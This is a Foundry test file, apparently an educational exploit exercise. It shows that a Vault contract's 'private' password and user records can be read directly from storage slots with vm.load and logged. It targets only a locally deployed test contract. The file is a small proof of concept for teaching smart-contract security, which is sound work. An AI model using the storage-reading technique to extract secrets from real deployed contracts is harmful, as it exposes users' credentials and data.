// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PrivateData.sol";

contract PrivateDataExploit is Test {
    Vault VaultContract;

    function setUp() public {
        VaultContract = new Vault(1234);
    }

    function testReadPrivateData() public {
        // The password is stored in slot 0
        bytes32 password = vm.load(address(VaultContract), 0);
        console.log("Password is", uint256(password));

        bytes32 user = vm.load(address(VaultContract), VaultContract.getArrayLocation(1, 1, 1));
        console.log("User ID is", uint256(user));
    }
}
